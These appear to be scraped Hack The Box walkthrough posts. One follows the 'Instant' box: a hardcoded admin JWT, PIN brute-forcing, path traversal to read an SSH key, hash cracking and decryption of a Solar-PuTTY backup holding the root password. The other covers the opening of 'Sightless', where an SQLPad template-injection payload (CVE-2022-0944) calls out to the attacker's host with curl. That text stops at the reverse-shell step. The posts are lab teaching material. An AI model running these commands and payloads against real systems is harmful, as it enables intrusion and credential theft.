public class AdminActivities { private String TestAdminAuthorization() { (new OkHttpClient()).newCall((new Request.Builder()).url(&#34;http://mywalletv1.instant.htb/api/v1/view/profile&#34;).addHeader(&#34;Authorization&#34;, &#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA&#34;).build()).enqueue(new Callback() { public void onFailure(Call param1Call, IOException param1IOException) { System.out.println(&#34;Error Here : &#34; + param1IOException.getMessage()); } public void onResponse(Call param1Call, Response param1Response) throws IOException { if (param1Response.isSuccessful()) { String str = param1Response.body().string(); try { str = JsonParser.parseString(str).getAsJsonObject().get(&#34;username&#34;).getAsString(); System.out.println(str); } catch (JsonSyntaxException jsonSyntaxException) { System.out.println(&#34;Error Here : &#34; + jsonSyntaxException.getMessage()); } } } }); return &#34;Done&#34;; } } I&rsquo;ll check this out in greater detail next &#x1f6a9;
The REST of the API There&rsquo;s a bit more code that provides insight. Within the LoginActivity class, we can see a login endpoint (that should return an auth token just like the one we found in AdminActivities):
POST /api/v1/login Body: JSON object with &#34;username&#34; and &#34;password&#34; keys Returns: an access token JWT Inside RegistrationActivity we see, unsurprisingly, the registration endpoint:
POST /api/v1/register Body: JSON object with &#34;username&#34;, &#34;email&#34;, &#34;password&#34;, and &#34;pin&#34; keys Returns: a JSON with a key &#34;Description&#34; that never actually gets used There&rsquo;s also TransactionActivity that holds the main functionality of their service, sending money to other users:
POST /api/v1/initiate/transaction Header: Authorization header JWT Body: JSON object with &#34;receiver&#34;, &#34;amount&#34;, and &#34;note&#34; keys Returns: a JSON with a key &#34;Description&#34; with a value of &#34;Transaction Pending! Waiting For Pin!&#34; POST /api/v1/confirm/pin Header: Authorization header JWT Body: JSON object with &#34;pin&#34; key Returns: a JSON with a key &#34;Description&#34; with a value of &#34;Transaction Successful&#34; &#x1f4a1; If the backend code handles checking the pin badly, then we could very easily bruteforce the pin.
Authentication Header Since it looks like a JWT, I attempted to decode it (using https://jwt.io). Turns out it decodes fine - it&rsquo;s an HS256 JWT, with the following payload:
{ &#34;id&#34;: 1, &#34;role&#34;: &#34;Admin&#34;, &#34;walId&#34;: &#34;f0eca6e5-783a-471d-9d8f-0162cbc900db&#34;, &#34;exp&#34;: 33259303656 } Nice! I should see if that API still exists. To play around with this API, I&rsquo;ll need to add it to my /etc/hosts file:
echo &#34;$RADDR mywalletv1.instant.htb&#34; | sudo tee -a /etc/hosts Other API versions Before I dive too deep into API v1, perhaps I should see if others exist. I&rsquo;ll check for versions 1 to 9:
for i in $(seq 1 9); do echo &#34;mywalletv$i&#34; &gt;&gt; api_versions.txt; done WLIST=api_versions ffuf -w $WLIST -u http://$RADDR -H &#34;Host: FUZZ.instant.htb&#34; -c -t 60 -timeout 4 -mc all Looks like only mywalletv1 resolves to a vhost &#x1f44d;
Other subdomains Since we found one subdomain in the source code, it might be worth checking for other ones also mentioned in the source code. Any subdomain should match the pattern *.instant.htb (yes, I know that&rsquo;s not as specific as a regex as I could make it), so we can just look for that term in the whole decompiled APK:
By doing it this way, I am not limiting myself to checking only the source code.
cd source/instant grep -ilR &#39;instant.htb&#39; ./ Ok let&rsquo;s take a look inside each of these, and see if they&rsquo;re just mentioning mywalletv1.instant.htb again:
grep -ilR &#39;instant.htb&#39; ./ | xargs -I {} sh -c &#39;echo &#34;\\nFILE: {} &#34;; grep &#34;instant.htb&#34; --binary-files=text {}&#39; &#x1f62e; Oh, whoa - The file res/8G.xml mentions a new subdomain that we had not seen before! Here&rsquo;s the UTF-8 parsed binary contents:
We clearly see two subdomains in there:
mywalletv1.instant.htb, which we knew about from before swagger-ui.instant.htb, unsure what this might be&hellip; I&rsquo;ll check these subdomains out next &#x1f6a9;
mywalletv1 API Now I&rsquo;ll try out the API using curl:
Not only is the API active, we&rsquo;ve just verified that the JWT is still active! The admin profile details were handed back to us as JSON:
&#34;Profile&#34;: { &#34;account_status&#34;:&#34;active&#34;, &#34;email&#34;:&#34;admin@instant.htb&#34;, &#34;invite_token&#34;:&#34;instant_admin_inv&#34;, &#34;role&#34;:&#34;Admin&#34;,&#34;username&#34;:&#34;instantAdmin&#34;, &#34;wallet_balance&#34;:&#34;10000000&#34;, &#34;wallet_id&#34;:&#34;f0eca6e5-783a-471d-9d8f-0162cbc900db&#34; } From what I saw in the source code, I could probably send &ldquo;money&rdquo; from the admin user to a user of my choice, as long as I can determine this user&rsquo;s pin.
FOOTHOLD Plan for the API Let&rsquo;s plan this out:
If the /POST /api/v1/confirm/pin requires that a transaction has already been issued, then I&rsquo;ll need to&hellip; register a new user initiate a transaction Brute force the pin If the /POST /api/v1/confirm/pin doesn&rsquo;t actually need a transaction, we can skip straight to it&hellip; Brute force the pin &#x261d;&#xfe0f; Either way, it might be smart to try registering a user first. Perhaps this will reveal what restrictions there are on the pin (how many digits, etc)
To check this out, I&rsquo;ll whip up a Python program to interact with the API. Nothing too fancy: all it needs to do is submit the requests that I outlined in the API description I wrote earlier.
Every response should return JSON, so that makes things easy &#x1f642;
The Python code itself is basically just plumbing, so I&rsquo;ll leave that as an exercise to the reader.
Interacting with the API As I mentioned earlier, it might be wise to try registering a user first - just to see if there are any restrictions on the pin:
if __name__ == &#34;__main__&#34;: # Try registering a user resp = register(&#34;jimbob&#34;, &#34;jimbob@fake.htb&#34;, &#34;Password123!&#34;, &#34;1&#34;) print(&#34;User registration:&#34;, resp) Perfect! Now we know the pin should be exactly 5 digits. Just so I have a user on-hand, I&rsquo;ll change the pin to 12345 and register one now (jimbob : Password123! with pin=12345):
OK, now that the user is registered, I&rsquo;ll log in:
if __name__ == &#34;__main__&#34;: # Log in as jimbob resp = login(&#34;jimbob&#34;, &#34;Password123!&#34;) print(resp) Now that I have the jwt, I can view the profile of jimbob:
Brute-forcing the pin I tried using my confirm_pin function to interact with /api/v1/confirm/pin, and seemed to work fine, but then I realized it was returning http 403 responses (and was running quite slowly)&hellip; instead of multithreading the program, why not just use ffuf?
for x in $(seq 0 99999); do printf &#34;%05d\\n&#34; $x &gt;&gt; all_pin_numbers.txt; done JWT=&#34;eyJhbGciOiJIU...EXKGtWZ6rYA&#34; ffuf -x http://127.0.0.1:8081 -w all_pin_numbers.txt:FUZZ -H &#34;Authorization: $JWT&#34; -H &#34;Content-Type: application/json&#34; -d &#39;{&#34;pin&#34;:&#34;FUZZ&#34;}&#39; -u http://mywalletv1.instant.htb/api/v1/confirm/pin -fc 403 Here&rsquo;s a sample of one of the requests:
This gives me a little hope that the API doesn&rsquo;t handle the PIN confirmation logic very well. i.e. we&rsquo;re able to &ldquo;confirm&rdquo; a PIN even when a transaction has not been initiated &#x1f602;
After about 7 minutes, I got a result:
&#x1f914; Hmm&hellip; There appears to be an error in the application when the PIN is confirmed. Maybe this error only occurs when no transaction has been initiated (in other words, it&rsquo;s a logic flaw)?
I&rsquo;d like to try sending jimbob some money, but when I read through the source code for the /initiate/transaction API endpoint, it&rsquo;s not immediately clear what the receiver parameter is:
If I had to guess, it&rsquo;s either:
The username of the receiving user The wallet_id of the receiving wallet &#x2705; I tried both methods: using the wallet_id was the correct way.
I&rsquo;ve modified my script to check both wallets&rsquo; balances, perform a transaction, then check the balances again:
if __name__ == &#34;__main__&#34;: def print_both(): print(view_profile(ADMIN_PROFILE[&#39;jwt&#39;])) print(view_profile(JIMBOB_PROFILE[&#39;jwt&#39;])) print_both() receiver = JIMBOB_PROFILE[&#39;wallet_id&#39;] resp = initiate_transaction(ADMIN_PROFILE[&#39;jwt&#39;], receiver, 1, &#34;Hey jimbob, here is one money for u&#34;) print(resp) resp = confirm_pin(ADMIN_PROFILE[&#39;jwt&#39;], ADMIN_PROFILE[&#39;pin&#39;]) print(resp) print_both() It seems like this is the right way to use the API, but I keep getting an HTTP 500 result for the pin verification&hellip; &#x1f914; Perhaps I&rsquo;ll hold off the heist for now, and check out the other subdomain I found.
Swagger subdomain I&rsquo;ll add the subdomain to my /etc/hosts, then take a look at it:
echo &#34;$RADDR swagger-ui.instant.htb&#34; | sudo tee -a /etc/hosts &#x1f926;&zwj;&#x2642;&#xfe0f; Ahhh&hellip; I knew the name &ldquo;Swagger&rdquo; was familiar - it&rsquo;s that popular API documentation software! Really kicking myself for not checking out this subdomain before playing with the mywalletv1.instant.htb API too much &#x1f602;
The API seems to be broken into three sections: Users, Logs, and Transactions. Additionally, there seems to be a separate set of admin endpoints that are available:
The /api/v1/admin/list/users endpoint seems useful:
Not only does this confirm that I had the right pin for the admin user, but now we see there is another previously-unknown user:
{ &#34;email&#34;:&#34;shirohige@instant.htb&#34;, &#34;role&#34;:&#34;instantian&#34;, &#34;secret_pin&#34;:42845, &#34;status&#34;:&#34;active&#34;, &#34;username&#34;:&#34;shirohige&#34;, &#34;wallet_id&#34;:&#34;458715c9-b15e-467b-8a3d-97bc3fcf3c11&#34; } The /api/v1/admin/view/logs endpoint also references this user, which suggests that they may be the app developer! Let&rsquo;s try reading that log file:
JWT=&#34;eyJhbGciOiJIUzI1NiIsI...qDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA&#34; curl -H &#34;Authorization: $JWT&#34; &#39;http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=1.log&#39; Local File Inclusion &#x1f602; OK, I think most people know where this is going now. This is a classic example of local file inclusion.
curl -H &#34;Authorization: $JWT&#34; &#34;http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=../../../../etc/passwd&#34; Nice - that was super easy. Since we can access a regular user&rsquo;s home directory, we might get lucky and find a private key for SSH:
curl -H &#34;Authorization: $JWT&#34; &#39;http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=../.ssh/id_rsa&#39; &#x1f911; Fantastic! Note that the highlighted section can be parsed directly as an array in many languages, including as a list in Python. I copied that text to the clipboard, then did the rest in python:
python3 &gt;&gt;&gt; arr = [paste] &gt;&gt;&gt; for l in arr: &gt;&gt;&gt; print(l.rstrip()) &gt;&gt;&gt; quit() From there, the SSH private key can be copy-pasted directly into a new file, using any text editor.
vim loot/id_rsa [paste] chmod 600 loot/id_rsa ssh -i loot/id_rsa shirohige@$RADDR There we go! Fairly easy RCE on the box, once we finally checked out the other subdomain &#x1f602;
USER FLAG &#x1f389; The SSH connection drops you into /home/shirohige, adjacent to the user flag. Simply cat it out for the points:
cat user.txt Also in their home directory is the project directory for the mywalletv1 API that we were interacting with:
The .env file contains some goodies:
SECRET_KEY=VeryStrongS3cretKeyY0uC4NTGET LOG_PATH=/home/shirohige/logs A quick check of app.py verifies that the SECRET_KEY is used for signing the JWTs. Also, there&rsquo;s an SQLite database instant.db, so I transferred that back to my attacker machine:
scp -i ./id_rsa shirohige@$RADDR:/home/shirohige/projects/mywallet/Instant-Api/mywallet/instance/instant.db ./instant.db sqlite3 instant.db .schema .mode csv .separator : select username,password from wallet_users; Cracking the hashes The hashes we obtained are PBKDF2-HMAC-SHA256 generated by Werkzeug&rsquo;s generate_password_hash() function. You can see how the passwords are hashed by examining the /api/v1/register endpoint in app.py:
from werkzeug.security import generate_password_hash, check_password_hash #... @app.route(&#34;/api/v1/register&#34;, methods=[&#39;POST&#39;]) def api_register(): if request.method == &#39;POST&#39;: data = request.get_json() username = data[&#39;username&#39;] email = data[&#39;email&#39;] password = data[&#39;password&#39;] pin = data[&#39;pin&#39;] # ... if len(pin) == 5: user = User(username, email, wall_id, generate_password_hash(password, method=&#34;pbkdf2&#34;), str(datetime.now()), int(pin), &#34;instantian&#34;, &#34;active&#34;) wallet = Wallet(wall_id, 0, f&#34;{username}_{email[:3]}&#34;) db.session.add(user) db.session.add(wallet) db.session.commit() # ... You can try it yourself like this:
python3 &gt;&gt;&gt; from werkzeug.security import generate_password_hash &gt;&gt;&gt; pw_hash = generate_password_hash(&#39;rockyou&#39;, method=&#39;pbkdf2&#39;) &gt;&gt;&gt; print(pw_hash) pbkdf2:sha256:600000$NJmGroHCwx0TCl0z$c10a63e2d93316572ba9d01d674fd720f1df549eb5cf5a35491aec6773d55387 We can interpret that hash like this:
PBKDF2 is the key derivation function SHA256 is the hashing algorithm 600,000 rounds/iterations of hashing were utilized the next part is a base-64 representation of the salt the final portion is the 32-byte hash in hexadecimal. As far as I know hashcat doesn&rsquo;t have a mode to handle these hashes directly. However, we can utilize mode 10900 as long as we transform the hash format a little:
After seeing this comment on Github, I wrote a small script for transforming the hash.
Check out my repo for handling PBKDF2-HMAC-SHA256 hashes for more detail. Specifically, we&rsquo;ll use this script from my repo to transform the hashes we obtained into hashes processable by hashcat&rsquo;s mode 10900.
If you found my script useful, please leave a &#x2b50;
I&rsquo;ll use that script to rewrite the hashes into a usable format:
Then toss the result into hashcat:
hashcat -m 10900 ../loot/wallet_users-5.hashes /usr/share/wordlists/rockyou.txt A couple minutes later, one of the hashes was cracked:
Matching up the hashes, I see that&rsquo;s for shirohige, so we&rsquo;ve obtained the credential shirohige : estrella that was used with the mywallet API &#x1f340;
ROOT FLAG Local Enumeration - shirohige To keep this walkthrough brief, I won&rsquo;t record my whole local enumeration process. Instead, I&rsquo;ll just jot down any notable results.
shirohige and root seem to be the only regular accounts on the box. There&rsquo;s also www-data, but that&rsquo;s probably just for Apache. estrella is not the password to the local shirohige account, so I can&rsquo;t check sudo -l shirohige is the owner of /opt/backups, and the suspicious-looking directory inside it too: There are two python-based servers running: serve.py is running Swagger on 8088 app.py is running the API on 8888 The Solar-PuTTY backup file was the most interesting thing I found during enumeration, so I&rsquo;ll grab a copy of it to examine locally:
cd loot scp -i ./id_rsa -r shirohige@$RADDR:/opt/backups/Solar-PuTTY ./Solar_PuTTY But what is this file? Some searching revealed that Solar-PuTTY is the SSH client that Solarwinds provides - it&rsquo;s just like PuTTY but with some convenience features. There must be some kind of backup/export feature.
Examining Solar_PuTTY/sessions_backup.dat, it is clear that this is fully encoded as base-64 data (look at the character set on the righthand side):
However, it seems like it doesn&rsquo;t decode into any valid UTF-8&hellip;
Maybe my best option is to just run Solar-PuTTY from wine? I downloaded a copy of it, and tried running it, but had no luck.
When I ran it using wine, I got an empty frame of a window where I was supposed to accept some Privacy policy that I couldn&rsquo;t see.
By playing around with hitting Tab a variable number of times then hitting Enter, I was eventually able to accept this privacy policy that I couldn&rsquo;t see, but then the application crashed entirely and will not run again.
Fun times. I love Windows /s &#x1f494;
I did a little research to try to find the format of this file, but the best I could find was this blog entry by a red-teamer that made a tool for decrypting the file. Unfortunately, their tool is written in C#, they didn&rsquo;t leave an .exe and I seem unable to use dotnet to compile it on my own system.
Thankfully, some kind soul out there (@ItsWatchMakerr) made a Python version of the same program: it&rsquo;s available right here, in their repo on Github. They seem to share my disdain for .NETframework.
git clone https://github.com/ItsWatchMakerr/SolarPuttyCracker.git python3 -m venv . source bin/activate pip3 install pycryptodome python3 SolarPuttyCracker/SolarPuttyCracker.py As expected, it takes a sessions_file. I&rsquo;ll guess that it&rsquo;s our sessions_backup.dat file that we exfil&rsquo;d earlier. Also, either a password or wordlist is required.
May as well start out with checking for credential re-use, right? We found shirohige : estrella earlier by cracking the password hashes from the API application:
python3 SolarPuttyCracker.py -p estrella ../../loot/Solar_PuTTY/sessions-backup.dat Huh? That seems like it was too easy. I guess I had substantial assistance from the author of this tool (I still am not sure how they figured out exactly what encryption algorithm was being used by the Solar-PuTTY backup utility) - thanks again, @ItsWatchMakerr!
However, any complexity to this box could have been eliminated if I simply had a Windows box to use. Then, I could have simply used the official Solar-PuTTY exe and loaded the saved sessions from the .dat export by entering the password&hellip;
I.e. there are two easy ways to go about doing this:
Load the file, the way the developers meant it to be loaded Use this cracking tool to obtain the session details Let&rsquo;s take a look inside the file it created, SolarPutty_sessions_decrypted.txt:
{ &#34;Sessions&#34;: [ { &#34;Id&#34;: &#34;066894ee-635c-4578-86d0-d36d4838115b&#34;, &#34;Ip&#34;: &#34;10.10.11.37&#34;, &#34;Port&#34;: 22, &#34;ConnectionType&#34;: 1, &#34;SessionName&#34;: &#34;Instant&#34;, &#34;Authentication&#34;: 0, &#34;CredentialsID&#34;: &#34;452ed919-530e-419b-b721-da76cbe8ed04&#34;, &#34;AuthenticateScript&#34;: &#34;00000000-0000-0000-0000-000000000000&#34;, &#34;LastTimeOpen&#34;: &#34;0001-01-01T00:00:00&#34;, &#34;OpenCounter&#34;: 1, &#34;SerialLine&#34;: null, &#34;Speed&#34;: 0, &#34;Color&#34;: &#34;#FF176998&#34;, &#34;TelnetConnectionWaitSeconds&#34;: 1, &#34;LoggingEnabled&#34;: false, &#34;RemoteDirectory&#34;: &#34;&#34; } ], &#34;Credentials&#34;: [ { &#34;Id&#34;: &#34;452ed919-530e-419b-b721-da76cbe8ed04&#34;, &#34;CredentialsName&#34;: &#34;instant-root&#34;, &#34;Username&#34;: &#34;root&#34;, &#34;Password&#34;: &#34;12**24nzC!r0c%q12&#34;, &#34;PrivateKeyPath&#34;: &#34;&#34;, &#34;Passphrase&#34;: &#34;&#34;, &#34;PrivateKeyContent&#34;: null } ], &#34;AuthScript&#34;: [], &#34;Groups&#34;: [], &#34;Tunnels&#34;: [], &#34;LogsFolderDestination&#34;: &#34;C:\\\\ProgramData\\\\SolarWinds\\\\Logs\\\\Solar-PuTTY\\\\SessionLogs&#34; } &#x1f602; Oh wow! That&rsquo;s probably the root password. Let&rsquo;s try it out:
su root # use password: 12**24nzC!r0c%q12 Nice - easy stuff! &#x1f370;
cat /root/root.txt EXTRA CREDIT Grepping for subdomains Partway through completing this box, I spent some time working on one of my tools, search-filesystem.sh. It&rsquo;s a bash script that recursively searches all of the following:
filenames contents of text files text-based contents of zip archives text-based contents of gzip archives All you do is provide the starting/base directory and a list of regexes to search for.
I wanted to see if this tool could have been applied to find the subdomains mywalletv1.instant.htb and swagger-ui.instant.htb. To get started, I wrote a one-line regex into a patterns.txt file:
Then I ran the script over the code (the results of running apktool):
search-filesystem.sh source/instant 5 2 ./patterns.txt &#x1f44f; Perfect! Using one simple regex, we can go through the source code and display the results easily &#x1f601;
CLEANUP Target I&rsquo;ll get rid of the spot where I place my tools, /tmp/.Tools:
rm -rf /tmp/.Tools Attacker There&rsquo;s also a little cleanup to do on my local / attacker machine. It&rsquo;s a good idea to get rid of any &ldquo;loot&rdquo; and source code I collected that didn&rsquo;t end up being useful, just to save disk space:
rm -rf loot/* It&rsquo;s also good policy to get rid of any extraneous firewall rules I may have defined. This one-liner just deletes all the ufw rules:
NUM_RULES=$(($(sudo ufw status numbered | wc -l)-5)); for (( i=0; i&lt;$NUM_RULES; i++ )); do sudo ufw --force delete 1; done; sudo ufw status numbered; LESSONS LEARNED Attacker &#x1f46c; When you discover one subdomain, there might be more. Whatever method you used to discover the first subdomain, try to dive a little deeper to find more. It probably won&rsquo;t take too long to f
&#x1f42c; If you have two options for things to investigate, and they might take a long time to dive into, it&rsquo;s best to just skip both of them before going too deep into one. I know that sounds a bit vague, but it&rsquo;s a mistake I catch myself making all the time - I get excited about a certain quirk of a webpage, or find an exploit for something, all the while forgetting to investigate something easy right in front of me!
Defender &#x1f4c6; Tokens should expire. Any authentication token should be a transient object. Otherwise, the service that the token is used for is open to attacks like session hijacking. In this box, we discovered a JWT within the instant.apk source code, and found that it was (for some reason) still valid! This could have been remedied by (A) not leaving secrets within the source code and (B) setting an expiry on the JWT.
&#x1f4c9; Beware accidentally downgrading security. On this box, we found the root password (for remote connections) by cracking the password to some lazily-encrypted Solar-PuTTY data export file. In this case, we only needed to find a password to a file on the local machine, to be able to remote-access root. The administrator should have asked themselves whether it was wise to lock a file that allows remote connections as root, using a weak password that was available locally &#x1f62c;
`,url:"https://4wayhandshake.github.io/walkthrough/instant/"},"https://4wayhandshake.github.io/walkthrough/sightless/":{title:"Sightless",tags:["SQLPad","Command Injection","Password Cracking","Shadowfile","Port Forwarding","Chrome Remote Debugger","Session Spying","FTPS","Keepass"],categories:["Walkthrough","HTB","Linux","Easy"],content:`INTRODUCTION Sightless is the box for week 6 of HTB&rsquo;s Season 6 Heist. It&rsquo;s a very creative box. While each step of this box is relatively simple, the creator (EmSec) throws many creative challenges at us with this one. There are a few rabbit-holes to watch out for, and it can be easy to feel a little lost while seeking privesc to root. Sightless requires you to actually work inside some GUI applications, instead of being able to root the box solely through a terminal.
Recon is dead simple. Even a quick glance at the page leads you towards a vulnerable subdomain. From there, fingerprinting the application running on that subdomain is enough for you to dig up a usable CVE that has a very user-friendly PoC written already. If you&rsquo;re quick with research, and don&rsquo;t get too hung-up on web enumeration, you can easily have a foothold within 10-15 minutes on this. Alternate encoding is helpful for delivering the payload to gain a foothold.
The foothold lands you inside a docker container. While there is a database initialization script in there that looks useful, it&rsquo;s actually just a distraction. The real loot is due to another form of password re-use. Once you find this, a little bit of password cracking will reveal the password for a valid user on the host system, allowing you to escape the docker container. The user flag is available as that user.
While there is another &ldquo;human&rdquo; user on the box, there is actually no need to pivot to that user: you can go straight from the first low-priv user to root. Good local enumeration is critical for this part of the box. The vulnerability is quite strange, and you&rsquo;ll miss it if you&rsquo;re not looking carefully. Be sure to examine the processes being intermittently ran by the other &ldquo;human&rdquo; user. With a bit of research (and cross-referencing with Linpeas) you&rsquo;ll be able to spy on the vulnerable process, and take advantage of the unencrypted service they&rsquo;re accessing. From there, it&rsquo;s as easy as finding a way to get that service to grant you access to the FTP/S that was visible even during early recon. Inside FTP/S, there will be an OpenSSH private key for accessing root.
RECON nmap scans Port scan For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http &#x1f6a8; FTP is present! I&rsquo;ll be sure to check that before HTTP.
Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 21/tcp open ftp | fingerprint-strings: | GenericLines: | 220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.129.40.243] | Invalid command: try being more creative |_ Invalid command: try being more creative 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA) |_ 256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://sightless.htb/ 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port21-TCP:V=7.94SVN%I=7%D=9/8%Time=66DD4B82%P=x86_64-pc-linux-gnu%r(Ge SF:nericLines,A2,&#34;220\\x20ProFTPD\\x20Server\\x20\\(sightless\\.htb\\x20FTP\\x20S SF:erver\\)\\x20\\[::ffff:10\\.129\\.40\\.243\\]\\r\\n500\\x20Invalid\\x20command:\\x2 SF:0try\\x20being\\x20more\\x20creative\\r\\n500\\x20Invalid\\x20command:\\x20try\\ SF:x20being\\x20more\\x20creative\\r\\n&#34;) Note the http redirect to http://sightless.htb
Vuln scan Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR No additional info resulted from this scan.
UDP scan To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR PORT STATE SERVICE VERSION 9/udp open|filtered tcpwrapped 49/udp open|filtered tcpwrapped 68/udp open|filtered tcpwrapped 139/udp open|filtered tcpwrapped 161/udp open|filtered snmp 623/udp open|filtered asf-rmcp 1645/udp open|filtered tcpwrapped 2048/udp open|filtered tcpwrapped 5060/udp open|filtered sip 9200/udp open|filtered tcpwrapped 32769/udp open|filtered filenet-rpc Note that any open|filtered ports are either open or (much more likely) filtered.
FTP I&rsquo;ll try an anonymous login for FTP first:
&ldquo;SSL/TLS required on the control channel&rdquo; means this is actually running FTPS (not SFTP). We can get around this by using lftp instead, which supports SSL/TLS:
The target is probably using a self-signed certificate. After diving through the man page a bit, I found I can set a variable to ignore verification of the cert:
lftp -e &#34;set ssl:verify-certificate no&#34; $RADDR We&rsquo;ve succesfully ignored the certificate verification, but unfortunately none of these credentials worked:
root : root anonymous : [blank] anonymous : anonymous The authentication attempts take a little while to resolve, so I&rsquo;ll probably come back to this when I some info about a valid credential.
Webserver Strategy Noting the redirect from the nmap scan, I added download.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=template.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb --aggression 3 http://$DOMAIN &amp;&amp; curl -IL http://$RADDR No surprises from whatweb. Next I&rsquo;ll perform vhost and subdomain enumeration. First, I&rsquo;ll check for alternate hosts:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v No results from this scan, but while it was running I took a look through the website itself. It looks like a typical landing page for a small IT company. The most interesting portion is the Services listed:
The Froxlor part links to an open source tool for server administration. Their repo is available on Github. Github shows that the current release is version 2.2.1. I&rsquo;ll take a look through this soon. For now, it gives us a taste of what to expect if we find some kind of admin dashboard: The Database &amp; Server Management part is just a distraction. It links to the nonexistent &ldquo;Contact Us&rdquo; mechanism. The SQLPad part reveals a subdomain! The Start Now button links to http://sqlpad.sightless.htb. Let&rsquo;s add that to /etc/hosts and take a look: A quick check shows that Froxlor has historically had some notable vulnerabilities&hellip; but I&rsquo;ll need to actually find Froxlor before I can make any attempts to exploit it!
Next I&rsquo;ll check for subdomains of sightless.htb. We already know about sqlpad, but are there more?
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/vhost-$DOMAIN.md -of md -timeout 4 -ic -ac -v No new results from that, either. Unfortunate, as I was hoping for an admin subdomain. I&rsquo;ll move on to directory enumeration on http://sightless.htb.
First, directory enumeration:
I prefer to not run a recursive scan, so that it doesn&rsquo;t get hung up on enumerating CSS and images.
WLIST=/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 60 -ic -c -o fuzzing/ffuf-directories-root -of json -timeout 4 -v Next I&rsquo;ll search for files:
WLIST=/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 60 -c -o fuzzing/ffuf-files-root -of json -e .php,.asp,.js,.html,.txt -timeout 4 -v No significant new results from that.
SQLPad SQLPad also appears to be an open-source project. There is a github repo available.
Since we already know that Froxlor is probably running on the target, I tried establishing a connection to the database for it. Reading throught the &ldquo;Getting Started&rdquo; documentation for Froxlor, we already know the database type, a likely database name, and two likely usernames (MySQL, froxlor_db, froxlor_user, and froxroot respectively).
I tried establishing a connection to localhost:3306 using all kinds of combinations of the above info - no luck.
Also, working under the assumption that Froxlor might be running locally in Docker, I also tried using froxlor as a hostname - also no luck. Thankfully, there is a Test Connection feature that we can play with, so I proxied it through ZAP:
Why not try this as an SSRF? Saving the above request as test_db_conn.raw, I tried parameterizing the port number and fuzzing for a database on a nonstandard port:
vim test_db_conn.raw # exchange 1111 for &#34;PORTNUM&#34; seq 1 65535 &gt; ports.lst ffuf -w ports.lst:PORTNUM -request test_db_conn.raw -t 40 -c -v Interestingly, this always led to exactly 1 error &#x1f914; No positive results though.
Maybe I&rsquo;ll try fingerprinting the SQLPad application and do some research instead?
While the About panel clearly shows that the version is 6.10.0, we can see from the SQLPad project repo on Github that the current version is 7.5.0! Such an out-of-date version might indicate that there was a vulnerability we can utilize&hellip;
A little bit of searching led me to this article. The author describes a PoC for an RCE vulnerability in SQLPad, where we can very simply achieve code execution by giving a malformed entry into the Database field when defining a new connection.
FOOTHOLD CVE-2022-0944 The vulnerability disclosed in the article I linked above was granted CVE-2022-0944, and was fixed in version 6.10.1. The RCE is blind, so let&rsquo;s start an HTTP server to act just as a proof-of-concept:
sudo ufw allow from $RADDR to any port 8000 proto tcp cd www simple-server 8000 -v Now let&rsquo;s try out the method described in the article. I&rsquo;ll use the following as the Database field in the New Connection form:
{{ process.mainModule.require(&#39;child_process&#39;).exec(&#39;curl http://10.10.14.48:8000/?msg=curl&#39;) }} No result. What about wget?
It worked immediately! Perfect. Let&rsquo;s stand up a reverse shell listender then refine the payload into a reverse shell:
